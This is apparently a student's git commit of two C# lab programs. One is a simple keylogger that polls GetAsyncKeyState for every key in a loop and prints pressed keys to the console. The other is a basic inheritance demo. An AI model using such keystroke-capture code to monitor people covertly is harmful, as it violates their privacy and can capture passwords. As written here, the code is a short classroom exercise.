7fde686c3abecf09cec36f666c7ae85a9bd2c22c
FunnyNeo <vano-vora@mail.ru>
2020-04-17 17:29:57 +0300

    Заливаю лабы

---
+++ Lab4.1/Lab4(1)/Program.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Linq;
+using System.Threading;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Lab4_1_
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern short GetAsyncKeyState(Int32 i);
+        static void Main(string[] args)
+        {
+            StartLogging();
+        }
+
+        static void StartLogging()
+        {
+            while (true)
+            {
+                Thread.Sleep(50);
+                for (Int32 i = 0; i < 255; i++)
+                {
+                    short keyState = GetAsyncKeyState(i);
+                    if (keyState == -32768)
+                    {
+                        Console.WriteLine((Keys)i);
+                        
+                    }
+                }
+            }
+        }
+    }
+}
---
+++ Labaaa3/Labaaa3/Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Labaaa3
+{
+    class Person
+    {
+        public string Name { get; set; }
+        public Person(string name)
+        {
+            Name = name;
+        }
+        public virtual void Display()
+        {
+            Console.WriteLine(Name);
+        }
+    }
+    class Employee : Person
+    {
+        public string Company { get; set; }
+        public Employee(string name, string company) : base(name)
+        {
+            Company = company;
+        }
+        public override void Display()
+        {
+            Console.WriteLine(Name + " работает в " + Company);
+        }
+    }
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Person p1 = new Person("Bill");
+            p1.Display(); // вызов метода Display из класса Person
+
+            Employee p2 = new Employee("Tom", "Microsoft");
+            p2.Display(); // вызов метода Display из класса Person
+
+            Console.ReadKey();
+        }
+    }
+}
